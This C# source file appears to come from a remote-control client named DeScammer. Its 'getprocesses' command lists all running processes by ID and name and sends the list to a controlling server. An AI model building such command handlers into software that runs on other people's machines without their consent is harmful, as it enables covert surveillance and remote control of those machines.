using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using DeScammer.API;

namespace DeScammer.Commands
{
    [Command("getprocesses", 0)]
    public class GetProcesses : Command
    {
        public override void Execute(string[] args)
        {
            List<string> processes = new List<string>();

            foreach(Process p in Process.GetProcesses())
            {
                processes.Add(p.Id.ToString()); // Add process id
                processes.Add(p.ProcessName); // Add process name
            }

            Variables.Server.Send(CommandManager.FormatCommand("listprocess", processes.ToArray())); // Send the processes
        }
    }
}
